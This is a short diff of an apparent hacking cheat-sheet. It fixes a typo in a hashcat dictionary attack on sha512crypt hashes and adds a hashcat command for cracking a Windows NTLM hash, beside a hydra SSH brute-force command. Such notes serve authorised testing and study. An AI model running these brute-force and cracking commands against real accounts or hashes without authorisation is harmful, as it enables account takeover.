@@ -16,7 +16,9 @@ sudo hydra -l "myusername" -P wordlist.txt 192.168.1.10 ssh
 <pre>
 # passoword hash crack
 
-sudo hashcat -a 0 -m 1800 -o crackedpasswords.txt hashes,txt worldlist.txt
+sudo hashcat -a 0 -m 1800 -o crackedpasswords.txt hashes.txt worldlist.txt
 
+# crack windows password with NTLM hash
+sudo hashcat -a 0 -m 1000 -o crackedpasswords.txt "1CA1A....." worldlist.txt
 </pre>
 
